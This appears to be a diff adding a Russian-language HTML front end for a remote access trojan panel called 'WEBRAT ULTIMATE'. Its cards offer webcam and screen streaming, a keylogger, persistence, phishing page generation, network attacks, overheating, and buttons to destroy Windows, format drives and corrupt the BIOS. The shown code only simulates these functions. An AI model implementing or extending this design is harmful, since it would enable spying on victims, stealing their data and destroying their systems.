@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🚨 WEBRAT ULTIMATE - Полный контроль</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            overflow-x: hidden;
+        }
+        
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.1;
+        }
+        
+        .header {
+            background: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            text-align: center;
+            border-bottom: 2px solid #ff0000;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
+        }
+        
+        .title {
+            font-size: 3rem;
+            color: #ff0000;
+            text-shadow: 0 0 20px #ff0000;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            color: #00ff00;
+            font-size: 1.2rem;
+        }
+        
+        .status-bar {
+            display: flex;
+            justify-content: space-around;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 15px;
+            margin: 20px;
+            border: 1px solid #00ff00;
+            border-radius: 5px;
+        }
+        
+        .status-item {
+            text-align: center;
+        }
+        
+        .status-value {
+            font-size: 1.5rem;
+            color: #ff0000;
+            font-weight: bold;
+        }
+        
+        .control-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            padding: 20px;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        
+        .control-card {
+            background: rgba(20, 20, 20, 0.9);
+            border: 2px solid;
+            border-radius: 10px;
+            padding: 25px;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+        
+        .control-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(255, 0, 0, 0.3);
+        }
+        
+        .card-title {
+            font-size: 1.8rem;
+            margin-bottom: 15px;
+            color: #00ff00;
+        }
+        
+        .card-desc {
+            color: #aaa;
+            margin-bottom: 20px;
+            font-size: 0.9rem;
+        }
+        
+        .card-button {
+            display: inline-block;
+            background: linear-gradient(45deg, #ff0000, #990000);
+            color: white;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            text-decoration: none;
+            text-align: center;
+        }
+        
+        .card-button:hover {
+            background: linear-gradient(45deg, #ff3333, #cc0000);
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
+        }
+        
+        .warning {
+            background: rgba(255, 0, 0, 0.1);
+            border: 2px solid #ff0000;
+            padding: 20px;
+            margin: 20px;
+            border-radius: 10px;
+            text-align: center;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            margin-top: 40px;
+            border-top: 1px solid #333;
+            color: #666;
+            font-size: 0.9rem;
+        }
+        
+        /* Цвета карточек */
+        .card-stream { border-color: #00ff00; }
+        .card-control { border-color: #ff9900; }
+        .card-destructive { border-color: #ff0000; }
+        .card-malware { border-color: #9900ff; }
+        .card-phishing { border-color: #00ccff; }
+        .card-fun { border-color: #ffff00; }
+        
+        /* Матрица фон */
+        @keyframes matrix {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(100%); }
+        }
+        
+        .matrix-char {
+            position: absolute;
+            color: #00ff00;
+            font-size: 14px;
+            animation: matrix linear infinite;
+        }
+    </style>
+</head>
+<body>
+    <!-- Матрица фон -->
+    <div class="matrix-bg" id="matrixBg"></div>
+    
+    <!-- Шапка -->
+    <div class="header">
+        <h1 class="title">🚨 WEBRAT ULTIMATE</h1>
+        <p class="subtitle">Полный контроль через браузер | Деструктивные функции | Стриминг</p>
+    </div>
+    
+    <!-- Статус бар -->
+    <div class="status-bar">
+        <div class="status-item">
+            <div class="status-label">Соединений</div>
+            <div class="status-value" id="connections">0</div>
+        </div>
+        <div class="status-item">
+            <div class="status-label">Пинг</div>
+            <div class="status-value" id="ping">0ms</div>
+        </div>
+        <div class="status-item">
+            <div class="status-label">ЦП</div>
+            <div class="status-value" id="cpu">0%</div>
+        </div>
+        <div class="status-item">
+            <div class="status-label">Память</div>
+            <div class="status-value" id="memory">0%</div>
+        </div>
+        <div class="status-item">
+            <div class="status-label">Температура</div>
+            <div class="status-value" id="temp">0°C</div>
+        </div>
+    </div>
+    
+    <!-- Предупреждение -->
+    <div class="warning">
+        ⚠️ <strong>ВНИМАНИЕ:</strong> Система предназначена ТОЛЬКО для образовательных целей и тестирования на СОБСТВЕННОМ оборудовании!
+    </div>
+    
+    <!-- Панель управления -->
+    <div class="control-grid">
+        <!-- Стриминг -->
+        <div class="control-card card-stream">
+            <h2 class="card-title">🎥 СТРИМИНГ</h2>
+            <p class="card-desc">Прямая трансляция с веб-камеры и монитора цели. Запись видео, скриншоты.</p>
+            <a href="stream.html" class="card-button">📡 Запустить стрим</a>
+        </div>
+        
+        <!-- Контроль -->
+        <div class="control-card card-control">
+            <h2 class="card-title">🎮 УДАЛЕННЫЙ КОНТРОЛЬ</h2>
+            <p class="card-desc">Полный контроль над системой: клавиатура, мышь, команды, файлы.</p>
+            <a href="control.html" class="card-button">⚙️ Открыть панель</a>
+        </div>
+        
+        <!-- Деструктивные функции -->
+        <div class="control-card card-destructive">
+            <h2 class="card-title">💣 ДЕСТРУКТИВНЫЕ ФУНКЦИИ</h2>
+            <p class="card-desc">Критические действия: снос Windows, форматирование, BIOS, загрузчик.</p>
+            <button class="card-button" onclick="showDestructivePanel()">☢️ Открыть</button>
+        </div>
+        
+        <!-- Троллинг -->
+        <div class="control-card card-fun">
+            <h2 class="card-title">😈 ТРОЛЛИНГ & СКРИМЕРЫ</h2>
+            <p class="card-desc">Пранки, скримеры, звуки, блокировка мыши/клавиатуры, фейковые ошибки.</p>
+            <button class="card-button" onclick="showTrollingPanel()">👻 Активировать</button>
+        </div>
+        
+        <!-- Мониторинг системы -->
+        <div class="control-card card-control">
+            <h2 class="card-title">📊 МОНИТОРИНГ СИСТЕМЫ</h2>
+            <p class="card-desc">Детальная информация: процессы, сеть, железо, температура, использование.</p>
+            <button class="card-button" onclick="showMonitoring()">🔍 Показать</button>
+        </div>
+        
+        <!-- Нагрев ПК -->
+        <div class="control-card card-destructive">
+            <h2 class="card-title">🔥 НАГРЕВ ПК</h2>
+            <p class="card-desc">Максимальная нагрузка на ЦП/ГПУ до достижения критической температуры.</p>
+            <button class="card-button" onclick="startOverheating()">🔥 Запустить нагрев</button>
+        </div>
+        
+        <!-- Файловый менеджер -->
+        <div class="control-card card-control">
+            <h2 class="card-title">📁 ФАЙЛОВЫЙ МЕНЕДЖЕР</h2>
+            <p class="card-desc">Просмотр, загрузка, удаление, шифрование файлов на целевой системе.</p>
+            <button class="card-button" onclick="openFileManager()">📂 Открыть</button>
+        </div>
+        
+        <!-- Кейлоггер -->
+        <div class="control-card card-malware">
+            <h2 class="card-title">⌨️ КЕЙЛОГГЕР</h2>
+            <p class="card-desc">Запись всех нажатий клавиш, скриншоты по таймеру, логи браузера.</p>
+            <button class="card-button" onclick="startKeylogger()">🔐 Активировать</button>
+        </div>
+        
+        <!-- Сеть -->
+        <div class="control-card card-control">
+            <h2 class="card-title">🌐 СЕТЕВЫЕ АТАКИ</h2>
+            <p class="card-desc">DDoS, ARP спуфинг, сниффинг пакетов, блокировка интернета.</p>
+            <button class="card-button" onclick="showNetworkTools()">📡 Инструменты</button>
+        </div>
+        
+        <!-- Автозагрузка -->
+        <div class="control-card card-malware">
+            <h2 class="card-title">🔄 АВТОЗАГРУЗКА</h2>
+            <p class="card-desc">Установка в автозагрузку, создание служб Windows, скрытие процесса.</p>
+            <button class="card-button" onclick="setupPersistence()">⚙️ Настроить</button>
+        </div>
+        
+        <!-- Фишинг -->
+        <div class="control-card card-phishing">
+            <h2 class="card-title">🎣 ФИШИНГ СТРАНИЦЫ</h2>
+            <p class="card-desc">Генератор фишинговых страниц: Steam, соцсети, банки, почта.</p>
+            <button class="card-button" onclick="showPhishingPanel()">🕸️ Создать</button>
+        </div>
+        
+        <!-- Ретранслятор -->
+        <div class="control-card card-control">
+            <h2 class="card-title">🔗 РЕТРАНСЛЯТОР</h2>
+            <p class="card-desc">Прокси через GitHub для обхода блокировок, шифрование трафика.</p>
+            <button class="card-button" onclick="setupRelay()">🔄 Настроить</button>
+        </div>
+    </div>
+    
+    <!-- Модальные окна -->
+    <div id="modals"></div>
+    
+    <!-- Футер -->
+    <div class="footer">
+        <p>🚨 WEBRAT ULTIMATE v2.0 | Только для легального тестирования | © 2024</p>
+        <p style="margin-top: 10px; font-size: 0.8rem; color: #ff0000;">
+            ⚠️ Использование против третьих лиц без разрешения - НЕЗАКОННО!
+        </p>
+    </div>
+    
+    <script>
+        // Матрица фон
+        function createMatrix() {
+            const bg = document.getElementById('matrixBg');
+            const chars = '01アイウエオカキクケコサシスセソ';
+            
+            for(let i = 0; i < 100; i++) {
+                const char = document.createElement('div');
+                char.className = 'matrix-char';
+                char.textContent = chars[Math.floor(Math.random() * chars.length)];
+                char.style.left = Math.random() * 100 + 'vw';
+                char.style.animationDuration = (Math.random() * 10 + 10) + 's';
+                char.style.animationDelay = Math.random() * 5 + 's';
+                char.style.opacity = Math.random() * 0.5 + 0.1;
+                bg.appendChild(char);
+            }
+        }
+        
+        // Обновление статуса
+        function updateStatus() {
+            // Имитация данных
+            document.getElementById('connections').textContent = 
+                Math.floor(Math.random() * 10);
+            document.getElementById('ping').textContent = 
+                Math.floor(Math.random() * 100) + 'ms';
+            document.getElementById('cpu').textContent = 
+                Math.floor(Math.random() * 100) + '%';
+            document.getElementById('memory').textContent = 
+                Math.floor(Math.random() * 100) + '%';
+            document.getElementById('temp').textContent = 
+                Math.floor(Math.random() * 30 + 40) + '°C';
+        }
+        
+        // Деструктивная панель
+        function showDestructivePanel() {
+            const modal = document.createElement('div');
+            modal.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0,0,0,0.9);
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                z-index: 1000;
+            `;
+            
+            modal.innerHTML = `
+                <div style="background: #111; padding: 30px; border: 3px solid #ff0000; border-radius: 10px; max-width: 600px; width: 90%;">
+                    <h2 style="color: #ff0000; margin-bottom: 20px;">☢️ ДЕСТРУКТИВНЫЕ ФУНКЦИИ</h2>
+                    <div style="color: #aaa; margin-bottom: 20px;">
+                        ⚠️ Эти действия могут НАВСЕГДА повредить операционную систему!
+                    </div>
+                    
+                    <div style="display: grid; gap: 10px;">
+                        <button onclick="destroyWindows()" style="background: #ff0000; color: white; padding: 15px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">
+                            💀 УНИЧТОЖИТЬ WINDOWS
+                        </button>
+                        
+                        <button onclick="formatDrives()" style="background: #990000; color: white; padding: 15px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">
+                            🗑️ ОТФОРМАТИРОВАТЬ ДИСКИ
+                        </button>
+                        
+                        <button onclick="corruptBIOS()" style="background: #660000; color: white; padding: 15px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">
+                            ⚡ ИСПОРТИТЬ BIOS
+                        </button>
+                        
+                        <button onclick="deleteBootloader()" style="background: #330000; color: white; padding: 15px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">
+                            🚫 УДАЛИТЬ ЗАГРУЗЧИК
+                        </button>
+                        
+                        <button onclick="blueScreen()" style="background: #0000ff; color: white; padding: 15px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">
+                            💙 ВЕЧНЫЙ СИНИЙ ЭКРАН
+                        </button>
+                    </div>
+                    
+                    <div style="margin-top: 20px;">
+                        <button onclick="this.parentElement.parentElement.parentElement.remove()" style="background: #333; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer;">
+                            ❌ ОТМЕНА
+                        </button>
+                    </div>
+                </div>
+            `;
+            
+            document.getElementById('modals').appendChild(modal);
+        }
+        
+        // Троллинг панель
+        function showTrollingPanel() {
+            const modal = document.createElement('div');
+            modal.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0,0,0,0.9);
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                z-index: 1000;
+            `;
+            
+            modal.innerHTML = `
+                <div style="background: #111; padding: 30px; border: 3px solid #ffff00; border-radius: 10px; max-width: 700px; width: 90%;">
+                    <h2 style="color: #ffff00; margin-bottom: 20px;">😈 ТРОЛЛИНГ & СКРИМЕРЫ</h2>
+                    
+                    <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 20px;">
+                        <button onclick="playScareSound()" style="background: #333; color: #ff9900; padding: 12px; border: 1px solid #ff9900; border-radius: 5px; cursor: pointer;">
+                            🔊 СКРИМЕР (звук)
+                        </button>
+                        
+                        <button onclick="showScareImage()" style="background: #333; color: #ff9900; padding: 12px; border: 1px solid #ff9900; border-radius: 5px; cursor: pointer;">
+                            🖼️ СКРИМЕР (изображение)
+                        </button>
+                        
+                        <button onclick="fakeVirusAlert()" style="background: #333; color: #ff0000; padding: 12px; border: 1px solid #ff0000; border-radius: 5px; cursor: pointer;">
+                            🦠 ФЕЙКОВЫЙ ВИРУС
+                        </button>
+                        
+                        <button onclick="blockMouse()" style="background: #333; color: #00ff00; padding: 12px; border: 1px solid #00ff00; border-radius: 5px; cursor: pointer;">
+                            🖱️ ЗАБЛОКИРОВАТЬ МЫШЬ
+                        </button>
+                        
+                        <button onclick="invertScreen()" style="background: #333; color: #9900ff; padding: 12px; border: 1px solid #9900ff; border-radius: 5px; cursor: pointer;">
+                            🌈 ИНВЕРТИРОВАТЬ ЭКРАН
+                        </button>
+                        
+                        <button onclick="randomClicks()" style="background: #333; color: #00ccff; padding: 12px; border: 1px solid #00ccff; border-radius: 5px; cursor: pointer;">
+                            🎯 СЛУЧАЙНЫЕ КЛИКИ
+                        </button>
+                        
+                        <button onclick="openManyTabs()" style="background: #333; color: #ff00ff; padding: 12px; border: 1px solid #ff00ff; border-radius: 5px; cursor: pointer;">
+                            📑 ОТКРЫТЬ 100 ВКЛАДОК
+                        </button>
+                        
+                        <button onclick="fakeUpdate()" style="background: #333; color: #00ffff; padding: 12px; border: 1px solid #00ffff; border-radius: 5px; cursor: pointer;">
+                            ⬆️ ФЕЙКОВОЕ ОБНОВЛЕНИЕ
+                        </button>
+                    </div>
+                    
+                    <div style="margin-top: 20px;">
+                        <button onclick="this.parentElement.parentElement.parentElement.remove()" style="background: #333; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer;">
+                            ❌ ЗАКРЫТЬ
+                        </button>
+                    </div>
+                </div>
+            `;
+            
+            document.getElementById('modals').appendChild(modal);
+        }
+        
+        // Нагрев ПК
+        function startOverheating() {
+            alert('🔥 ЗАПУСК НАГРЕВА ПК...\nЦП и ГПУ будут загружены на 100% до достижения критической температуры.');
+            // Здесь будет реальный код для нагрузки на процессор
+        }
+        
+        // Имитация функций
+        function destroyWindows() {
+            alert('💀 УНИЧТОЖЕНИЕ WINDOWS АКТИВИРОВАНО!\nСистемные файлы будут повреждены через 10 секунд...');
+        }
+        
+        function playScareSound() {
+            const audio = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-horror-lose-2028.mp3');
+            audio.play();
+        }
+        
+        // Инициализация
+        createMatrix();
+        setInterval(updateStatus, 2000);
+        updateStatus();
+        
+        // Автообновление
+        setInterval(() => {
+            // Имитация активности
+        }, 5000);
+    </script>
+</body>
+</html>
